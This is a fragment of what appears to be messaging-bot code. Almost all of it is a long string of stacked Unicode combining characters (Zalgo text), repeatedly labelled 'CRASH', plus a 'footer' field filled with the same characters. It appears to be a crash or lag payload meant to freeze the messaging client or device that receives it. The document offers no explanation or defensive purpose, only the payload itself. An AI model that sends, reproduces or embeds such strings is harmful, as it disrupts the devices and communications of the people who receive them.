̷͜͢͠.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀",
                  footer: "🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̆͂̈́͂̂